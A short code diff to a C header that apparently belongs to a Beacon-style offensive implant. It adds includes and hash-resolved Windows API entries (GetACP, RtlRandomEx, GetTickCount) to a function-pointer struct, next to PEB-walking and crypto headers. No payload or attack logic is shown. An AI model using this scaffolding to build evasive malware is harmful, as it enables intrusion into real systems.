@@ -14,6 +14,7 @@
 
 #include "macros.h"
 #include "hashes.h"
+#include "apidef.h"
 
 typedef struct
 {
@@ -30,14 +31,18 @@ typedef struct
 
 	struct
 	{
+		FUNC( GetACP );
+		FUNC( GetOEMCP );
 		FUNC( LocalLock );
 		FUNC( LocalFree );
 		FUNC( LocalSize );
 		FUNC( LocalAlloc );
+		FUNC( RtlRandomEx );
 		FUNC( FreeLibrary );
 		FUNC( LocalUnlock );
 		FUNC( LocalReAlloc );
 		FUNC( LoadLibraryA );
+		FUNC( GetTickCount );
 		FUNC( CryptDecrypt );
 		FUNC( CryptEncrypt );
 		FUNC( CryptHashData );
@@ -63,8 +68,11 @@ typedef struct
 #include "crypt/hmac.h"
 #include "crypt/rsa.h"
 #include "crypt/aes.h"
+#include "random.h"
 #include "sha256.h"
 #include "tebpeb.h"
+#include "beacon.h"
+#include "buffer.h"
 #include "hash.h"
 #include "peb.h"
 #include "pe.h"
